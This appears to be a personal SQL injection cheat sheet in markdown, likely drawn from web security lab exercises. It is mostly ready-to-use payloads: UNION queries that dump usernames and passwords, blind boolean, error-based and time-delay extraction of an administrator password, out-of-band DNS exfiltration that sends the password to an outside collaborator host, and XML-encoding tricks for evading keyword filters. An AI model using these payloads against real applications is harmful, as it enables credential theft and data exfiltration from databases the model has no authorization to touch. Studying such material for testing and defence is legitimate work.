# SQL Injection
#Injection #OAST #Password-Cracking #SQL #XXE 

SQL injection (SQLi) is a web security vulnerability that allows an attacker to **interfere** with the queries that an application makes to its **database**. It generally allows an attacker to **view** data that they are not normally able to retrieve.

## Union Attacks
For a union attack the number of columns **must** match that of the table. To determine the number of columns in the table you can use a brute force method:
`'ORDER BY 1--` ,  `'ORDER BY 2--`, ...

To find which columns support string datatypes the following **bruteforce** method can be used:
`'UNION SELECT 'a', NULL, NULL--`, `'UNION SELECT NULL, 'a', NULL`, ...

In order to retrieve data from other tables, you can use a **union operator** to select data from other tables. For example:
`'UNION SELECT username, password, NULL FROM users--`

**Multiple** values can be retrieved in a single column by **concatenating** data using the following technique:
`'UNION SELECT NULL, username || '~' || password FROM users--`

## Retrieving Database Information
### Database Version
|Database Type|Command|
|:--:|----|
|Microsoft, MySQL|`SELECT @@version`|
|Oracle|`SELECT * FROM v$version`|
|PostgreSQL|`SELECT version()`|

### Database Tables
|Database Type|Command|
|:--:|----|
|Non-Oracle|`SELECT * FROM information_schema.tables`|
|Oracle|`SELECT * FROM all_tables`|

### Database Columns
|Database Type|Command|
|:--:|----|
|Non-Oracle|`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`|
|Oracle|`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`|

## Blind Attacks
Consider an application which uses a tracking cookie.
`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

An application might process this cookie in the following way:
`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

This query would be **vulnerable** to SQL injection, but the results are not returned to the user. However, the application would **behave differently** depending on whether or not the statement is valid/true or invalid/false.

### Conditional Responses
A password can be **cracked** using the following bruteforce technique where the character is incremented until the statement is true:
`TrackingId=u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) ='a`

### Conditional Responses (Error based)
Sometimes a **visable** change will not occurr whether the statement is true or false. Therefore, we can use errors returned in order to **crack** values from a table. For example:
``TrackingId=u5YD3PapBcR4lN3e7Tj4'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

## Time Delays
|Database Type|Command|
|:--:|----|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|

### Time Delays (Retrieving Information)
When no information is changed on the page with a true/false SQL statement, **time delays** can be used to determine information. See the example below for a **bruteforce** password attack using a time delay.
`TrackingId=59fmUItRvOvqXVI4'; SELECT CASE WHEN username = 'administrator' and substring(password, 1, 1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--`

## Out-Of-Band (OAST) DNS Exfiltration
The easiest way to exfiltrate data from a network is using **DNS**.

The techniques for triggering a DNS query are **highly specific** to the type of database being used. On **Microsoft SQL** Server, input like the following can be used to cause a DNS **lookup** on a specified domain:
`'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--`

Having confirmed a way to trigger **out-of-band interactions**, you can then use the out-of-band channel to **exfiltrate** data from the vulnerable application. For example:
`'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--`

|Database Type|Command|
|---|---|
|Oracle (Exploit)|`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual`
|Oracle (Admin)|`SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')`|
|Microsoft|`exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'`|
|PostgreSQL|`copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'`|
|MySQL (Windows)|`LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')`<br>`SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'`|

## XML Encoding
Some websites take input in **JSON** or **XML** format and use this to query the database. These alternative formats may provide different ways to **obfuscate attacks**. 

An example of using **XML** to exploit an SQL injection attack may look like the following:
```xml
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

Bad implementations often just look for **common** SQL injection **keywords** within the request, so you may be able to bypass these filters by simply **encoding** or **escaping** characters in the **prohibited** keywords. For example, the above XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`.